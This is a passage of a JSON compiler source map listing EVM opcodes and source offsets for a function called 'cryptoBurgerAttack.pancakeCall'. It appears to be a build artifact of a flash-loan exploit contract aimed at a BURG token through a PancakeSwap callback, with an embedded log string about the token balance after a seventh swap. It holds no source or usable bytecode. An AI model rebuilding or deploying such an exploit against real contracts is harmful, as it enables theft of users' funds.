      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4197": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4198": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1073"
    },
    "4201": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "4202": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4203": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4205": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4206": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "4207": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4208": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4210": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "REVERT",
      "path": "0"
    },
    "4211": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4212": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "POP",
      "path": "0"
    },
    "4213": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "POP",
      "path": "0"
    },
    "4214": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "POP",
      "path": "0"
    },
    "4215": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "POP",
      "path": "0"
    },
    "4216": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4218": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4219": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4220": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "4222": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "NOT",
      "path": "0"
    },
    "4223": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "4225": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "DUP3",
      "path": "0"
    },
    "4226": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "ADD",
      "path": "0"
    },
    "4227": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "AND",
      "path": "0"
    },
    "4228": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "DUP3",
      "path": "0"
    },
    "4229": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "ADD",
      "path": "0"
    },
    "4230": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4231": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4233": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "4234": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "POP",
      "path": "0"
    },
    "4235": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4236": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "ADD",
      "path": "0"
    },
    "4237": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4238": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1097"
    },
    "4241": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4242": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4243": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DCC"
    },
    "4246": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        6128,
        6167
      ],
      "op": "JUMP",
      "path": "0"
    },
    "4247": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6128,
        6167
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4248": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6071,
        6177
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4250": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6071,
        6177
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4251": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6071,
        6177
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x10A4"
    },
    "4254": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6071,
        6177
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4255": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6071,
        6177
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4256": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6071,
        6177
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DE5"
    },
    "4259": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        6071,
        6177
      ],
      "op": "JUMP",
      "path": "0"
    },
    "4260": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6071,
        6177
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4261": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6071,
        6177
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4263": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6071,
        6177
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4264": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6071,
        6177
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4265": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6071,
        6177
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4266": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6071,
        6177
      ],
      "op": "SUB",
      "path": "0"
    },
    "4267": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6071,
        6177
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4268": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6071,
        6177
      ],
      "op": "LOG1",
      "path": "0"
    },
    "4269": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6187,
        6251
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 34,
      "value": "0x10E0"
    },
    "4272": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4274": {
      "op": "DUP1"
    },
    "4275": {
      "op": "MLOAD"
    },
    "4276": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "4278": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "4281": {
      "op": "DUP4"
    },
    "4282": {
      "op": "CODECOPY"
    },
    "4283": {
      "op": "DUP2"
    },
    "4284": {
      "op": "MLOAD"
    },
    "4285": {
      "op": "SWAP2"
    },
    "4286": {
      "op": "MSTORE"
    },
    "4287": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4289": {
      "op": "DUP1"
    },
    "4290": {
      "op": "MLOAD"
    },
    "4291": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "4293": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "4296": {
      "op": "DUP4"
    },
    "4297": {
      "op": "CODECOPY"
    },
    "4298": {
      "op": "DUP2"
    },
    "4299": {
      "op": "MLOAD"
    },
    "4300": {
      "op": "SWAP2"
    },
    "4301": {
      "op": "MSTORE"
    },
    "4302": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6208,
        6220
      ],
      "op": "DUP4",
      "path": "0"
    },
    "4303": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6221,
        6222
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4305": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6208,
        6223
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4306": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6208,
        6223
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4307": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6208,
        6223
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4308": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6208,
        6223
      ],
      "op": "LT",
      "path": "0"
    },
    "4309": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6208,
        6223
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "4312": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6208,
        6223
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "4313": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6208,
        6223
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "4316": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6208,
        6223
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "4319": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        6208,
        6223
      ],
      "op": "JUMP",
      "path": "0"
    },
    "4320": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6187,
        6251
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4321": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 35,
      "value": "0x40"
    },
    "4323": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4324": {
      "op": "PUSH4",
      "value": "0x7C0329D"
    },
    "4329": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "4331": {
      "op": "SHL"
    },
    "4332": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4333": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "4334": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4336": {
      "op": "DUP1"
    },
    "4337": {
      "op": "MLOAD"
    },
    "4338": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "4340": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "4343": {
      "op": "DUP4"
    },
    "4344": {
      "op": "CODECOPY"
    },
    "4345": {
      "op": "DUP2"
    },
    "4346": {
      "op": "MLOAD"
    },
    "4347": {
      "op": "SWAP2"
    },
    "4348": {
      "op": "MSTORE"
    },
    "4349": {
      "offset": [
        526,
        568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4350": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6326
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1F00CA74"
    },
    "4355": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6326
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4356": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1113"
    },
    "4359": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4360": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6340,
        6355
      ],
      "op": "DUP7",
      "path": "0"
    },
    "4361": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6340,
        6355
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4362": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6369,
        6373
      ],
      "op": "DUP7",
      "path": "0"
    },
    "4363": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6369,
        6373
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4364": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "4366": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "ADD",
      "path": "0"
    },
    "4367": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2CED"
    },
    "4370": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        6276,
        6383
      ],
      "op": "JUMP",
      "path": "0"
    },
    "4371": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4372": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4374": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4376": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4377": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4378": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "DUP4",
      "path": "0"
    },
    "4379": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "SUB",
      "path": "0"
    },
    "4380": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4381": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "DUP7",
      "path": "0"
    },
    "4382": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "GAS",
      "path": "0"
    },
    "4383": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "4384": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4385": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4386": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4387": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1130"
    },
    "4390": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "4391": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4392": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4394": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4395": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "4396": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4397": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4399": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "REVERT",
      "path": "0"
    },
    "4400": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4401": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "POP",
      "path": "0"
    },
    "4402": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "POP",
      "path": "0"
    },
    "4403": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "POP",
      "path": "0"
    },
    "4404": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "POP",
      "path": "0"
    },
    "4405": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4407": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4408": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4409": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4411": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "DUP3",
      "path": "0"
    },
    "4412": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "4413": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "4415": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4416": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4417": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4418": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "ADD",
      "path": "0"
    },
    "4419": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "4421": {
      "op": "NOT"
    },
    "4422": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "AND",
      "path": "0"
    },
    "4423": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "DUP3",
      "path": "0"
    },
    "4424": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "ADD",
      "path": "0"
    },
    "4425": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4427": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "4428": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1158"
    },
    "4431": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4432": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4433": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4434": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "ADD",
      "path": "0"
    },
    "4435": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4436": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D0E"
    },
    "4439": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        6276,
        6383
      ],
      "op": "JUMP",
      "path": "0"
    },
    "4440": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6276,
        6383
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4441": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6261,
        6383
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4442": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6261,
        6383
      ],
      "op": "POP",
      "path": "0"
    },
    "4443": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4445": {
      "op": "DUP1"
    },
    "4446": {
      "op": "MLOAD"
    },
    "4447": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "4449": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "4452": {
      "op": "DUP4"
    },
    "4453": {
      "op": "CODECOPY"
    },
    "4454": {
      "op": "DUP2"
    },
    "4455": {
      "op": "MLOAD"
    },
    "4456": {
      "op": "SWAP2"
    },
    "4457": {
      "op": "MSTORE"
    },
    "4458": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6491,
        6503
      ],
      "op": "DUP2",
      "path": "0",
      "statement": 36
    },
    "4459": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6504,
        6505
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4461": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6491,
        6506
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4462": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6491,
        6506
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4463": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6491,
        6506
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4464": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6491,
        6506
      ],
      "op": "LT",
      "path": "0"
    },
    "4465": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6491,
        6506
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x117C"
    },
    "4468": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6491,
        6506
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "4469": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6491,
        6506
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x117C"
    },
    "4472": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6491,
        6506
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "4475": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        6491,
        6506
      ],
      "op": "JUMP",
      "path": "0"
    },
    "4476": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6491,
        6506
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4477": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6491,
        6506
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "4479": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6491,
        6506
      ],
      "op": "MUL",
      "path": "0"
    },
    "4480": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6491,
        6506
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "4482": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6491,
        6506
      ],
      "op": "ADD",
      "path": "0"
    },
    "4483": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6491,
        6506
      ],
      "op": "ADD",
      "path": "0"
    },
    "4484": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6491,
        6506
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4485": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6398,
        6516
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4487": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6398,
        6516
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4488": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6398,
        6516
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x11DF"
    },
    "4491": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6398,
        6516
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4492": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        6398,
        6516
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4493": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "4495": {
      "op": "DUP1"
    },
    "4496": {
      "op": "DUP3"
    },
    "4497": {
      "op": "MSTORE"
    },
    "4498": {
      "op": "PUSH1",
      "value": "0x3C"
    },
    "4500": {
      "op": "SWAP1"
    },
    "4501": {
      "op": "DUP3"
    },
    "4502": {
      "op": "ADD"
    },
    "4503": {
      "op": "MSTORE"
    },
    "4504": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "4506": {
      "op": "DUP1"
    },
    "4507": {
      "op": "MLOAD"
    },
    "4508": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "4510": {
      "op": "PUSH2",
      "value": "0x2FDE"
    },
    "4513": {
      "op": "DUP4"
    },
    "4514": {
      "op": "CODECOPY"
    },
    "4515": {
      "op": "DUP2"
    },
    "4516": {
      "op": "MLOAD"
    },
    "4517": {
      "op": "SWAP2"
    },
    "4518": {
      "op": "MSTORE"
    },
    "4519": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "4521": {
      "op": "DUP3"
    },
    "4522": {
      "op": "ADD"
    },
    "4523": {
      "op": "MSTORE"
    },
    "4524": {
      "op": "PUSH32",
      "value": "0x204255524720746F6B656E2061667465722037746820737761703A2000000000"
    },
    "4557": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "4559": {
      "op": "DUP3"
    },
    "4560": {
      "op": "ADD"
    },
    "4561": {
      "op": "MSTORE"
    },
    "4562": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "4564": {
      "op": "DUP2"
    },
    "4565": {
      "op": "ADD"
    },
    "4566": {
      "op": "SWAP2"
    },
    "4567": {
      "op": "SWAP1"
    },
    "4568": {
      "op": "SWAP2"
    },
    "4569": {
      "op": "MSTORE"
    },
    "4570": {
      "op": "PUSH1",
